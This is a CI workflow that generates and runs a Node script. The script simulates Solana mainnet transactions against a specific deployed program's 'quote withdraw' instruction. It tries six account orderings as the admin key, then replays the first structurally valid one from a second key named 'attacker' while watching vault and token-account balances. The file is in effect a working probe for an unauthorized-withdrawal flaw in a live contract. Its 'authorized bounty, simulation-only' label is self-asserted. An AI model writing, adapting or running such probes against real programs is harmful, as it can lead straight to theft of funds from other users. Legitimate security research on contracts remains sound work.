name: mayhem-quote-withdraw-order-v3
on:
  push:
    branches: [audit/boost-runtime-probe-20260815]
    paths: ['.github/workflows/mayhem-quote-withdraw-order-v3.yml']
  workflow_dispatch:
permissions:
  contents: read
jobs:
  simulate:
    runs-on: ubuntu-24.04
    timeout-minutes: 12
    steps:
      - uses: actions/setup-node@v4
        with: {node-version: 24}
      - run: npm install --no-save @solana/web3.js @solana/spl-token
      - name: Simulation-only quote-withdraw account-order recovery
        shell: bash
        run: |
          cat > x.mjs <<'NODE'
          import {PublicKey,Transaction,TransactionInstruction,SystemProgram} from '@solana/web3.js';
          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token';
          const MAY=new PublicKey('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e'),GP=new PublicKey('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ'),SV=new PublicKey('BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s'),ADMIN=new PublicKey('FFWtrEQ4B4PKQoVuHYzZq8FabGkVatYzDpEVHsK5rrhF'),ALT=new PublicKey('39azUYFWPz3VHgKCf3VChUwbpURdCHRxjWVowf5jUJjg'),EA=new PublicKey('8FoNgzmjuSmiy86EPCWxvv1q7oJSu2WGA7wPymwki2LJ'),USDC=new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
          const svAta=getAssociatedTokenAddressSync(USDC,SV,true,TOKEN_PROGRAM_ID),adminAta=getAssociatedTokenAddressSync(USDC,ADMIN,true,TOKEN_PROGRAM_ID),altAta=getAssociatedTokenAddressSync(USDC,ALT,true,TOKEN_PROGRAM_ID),DISC=Buffer.from('cc712a30723af859','hex'),amt=Buffer.alloc(8);amt.writeBigUInt64LE(1n);const DATA=Buffer.concat([DISC,amt]);
          const RPCS=['https://api.mainnet-beta.solana.com','https://rpc.solanatracker.io/public','https://solana-rpc.publicnode.com'];let id=1;const sl=m=>new Promise(r=>setTimeout(r,m));async function q(u,m,p,n=5){let e;for(let i=0;i<n;i++){try{const r=await fetch(u,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method:m,params:p})});if(r.status===429||r.status>=500){e=Error('HTTP '+r.status);await sl(250+450*i);continue}const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return j.result}catch(x){e=x;await sl(150)}}throw e}async function call(m,p){let e;for(const u of RPCS){try{return await q(u,m,p)}catch(x){e=x;console.log('RPCFAIL',m,u,String(x).slice(0,130))}}throw e}
          const M=(pk,s=false,w=false)=>({pubkey:pk,isSigner:s,isWritable:w});
          function layouts(who){const dest=who.equals(ADMIN)?adminAta:altAta;return {
            R1:[M(who,true,true),M(GP,false,true),M(SV,false,true),M(USDC),M(TOKEN_PROGRAM_ID),M(svAta,false,true),M(ASSOCIATED_TOKEN_PROGRAM_ID),M(dest,false,true),M(SystemProgram.programId),M(EA),M(MAY)],
            R2:[M(who,true,true),M(GP,false,true),M(SV,false,true),M(USDC),M(TOKEN_PROGRAM_ID),M(svAta,false,true),M(dest,false,true),M(ASSOCIATED_TOKEN_PROGRAM_ID),M(SystemProgram.programId),M(EA),M(MAY)],
            R3:[M(who,true,true),M(GP,false,true),M(SV,false,true),M(USDC),M(TOKEN_PROGRAM_ID),M(ASSOCIATED_TOKEN_PROGRAM_ID),M(svAta,false,true),M(dest,false,true),M(SystemProgram.programId),M(EA),M(MAY)],
            R4:[M(who,true,true),M(GP,false,true),M(SV,false,true),M(USDC),M(TOKEN_PROGRAM_ID),M(svAta,false,true),M(SystemProgram.programId),M(ASSOCIATED_TOKEN_PROGRAM_ID),M(dest,false,true),M(EA),M(MAY)],
            R5:[M(who,true,true),M(GP,false,true),M(SV,false,true),M(USDC),M(TOKEN_PROGRAM_ID),M(svAta,false,true),M(dest,false,true),M(SystemProgram.programId),M(ASSOCIATED_TOKEN_PROGRAM_ID),M(EA),M(MAY)],
            R6:[M(who,true,true),M(GP,false,true),M(SV,false,true),M(USDC),M(TOKEN_PROGRAM_ID),M(ASSOCIATED_TOKEN_PROGRAM_ID),M(SystemProgram.programId),M(svAta,false,true),M(dest,false,true),M(EA),M(MAY)]
          }}
          const watch=[GP,SV,svAta,adminAta,altAta,ADMIN];
          function token(a){if(!a)return null;const b=Buffer.from(a.data[0],'base64');return b.length>=72?b.readBigUInt64LE(64).toString():null}
          async function sim(label,who,keys){const ix=new TransactionInstruction({programId:MAY,keys,data:DATA});const bh=(await call('getLatestBlockhash',[{commitment:'confirmed'}])).value.blockhash;const tx=new Transaction({feePayer:ALT,recentBlockhash:bh}).add(ix),raw=tx.serialize({requireAllSignatures:false,verifySignatures:false});let v,used;for(const u of RPCS){try{v=(await q(u,'simulateTransaction',[raw.toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'confirmed',accounts:{encoding:'base64',addresses:watch.map(x=>x.toBase58())}}],3)).value;used=u;break}catch(e){console.log('SIMFAIL',label,u,String(e).slice(0,140))}}if(!v)return {noSim:true};const logs=v.logs??[],snap=(v.accounts??[]).map((a,i)=>({address:watch[i].toBase58(),exists:!!a,owner:a?.owner??null,lamports:a?.lamports??null,tokenAmount:token(a)}));const r={label,who:who.toBase58(),rpc:used,err:v.err,units:v.unitsConsumed,snapshot:snap,instructions:logs.filter(x=>x.includes('Instruction:')),anchor:logs.filter(x=>/AnchorError|Error Code|Error Number/.test(x)),failed:logs.filter(x=>x.includes('failed:')),interesting:logs.filter(x=>/quote|token|associated|program|Withdraw|Permission|Signer|vault/i.test(x))};console.log('RESULT',JSON.stringify(r,null,2));return r}
          let winner=null;for(const [label,keys] of Object.entries(layouts(ADMIN))){const r=await sim(label,ADMIN,keys);const structural=(r.anchor??[]).some(x=>/InvalidProgramId|AccountOwnedByWrongProgram|NotEnoughAccountKeys|ConstraintToken|ConstraintAssociated|ConstraintAddress/.test(x));if(!structural){winner={label,r};break}await sl(150)}console.log('WINNER',winner?.label??null);if(winner){const a=await sim(winner.label+'-attacker',ALT,layouts(ALT)[winner.label]);console.log('PAIR',JSON.stringify({control:winner.r,attacker:a},null,2))}
          NODE
          node x.mjs
